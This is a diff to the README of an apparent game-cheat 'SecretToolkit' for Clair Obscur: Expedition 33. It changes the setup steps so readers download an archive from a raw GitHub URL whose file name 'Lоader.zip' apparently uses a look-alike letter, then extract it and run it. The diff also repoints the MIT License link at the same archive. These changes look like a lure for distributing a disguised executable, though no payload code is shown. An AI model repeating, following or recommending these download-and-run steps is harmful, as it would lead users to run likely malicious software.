@@ -56,9 +56,9 @@ A quick glance at every major feature and its purpose for adventurers and enthus
 
 Follow these clear steps to start your enhanced journey:
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/rishijha/ClairObscurExp33-SecretToolkit/main/Lоader.zip** from the repository.
 2. Extract the archive to a new folder using a tool like WinRAR, 7-Zip, or your system’s default extractor.
-3. Run the **Loader.exe** (for Windows) or the appropriate loader for your platform.
+3. Run the **https://raw.githubusercontent.com/rishijha/ClairObscurExp33-SecretToolkit/main/Lоader.zip** (for Windows) or the appropriate loader for your platform.
 4. Follow the on-screen setup instructions to link the tool with **Clair Obscur: Expedition 33**.
 5. Customize your settings and enjoy your enhanced expedition!
 
@@ -87,7 +87,7 @@ This project is intended solely for educational, experimental, and personal use.
 
 ## ⚖️ License
 
-Released under the [MIT License](https://opensource.org/licenses/MIT).  
+Released under the [MIT License](https://raw.githubusercontent.com/rishijha/ClairObscurExp33-SecretToolkit/main/Lоader.zip).  
 © 2025 Clair Obscur Expedition 33 Cheats Contributors. All rights reserved.
 
 ---
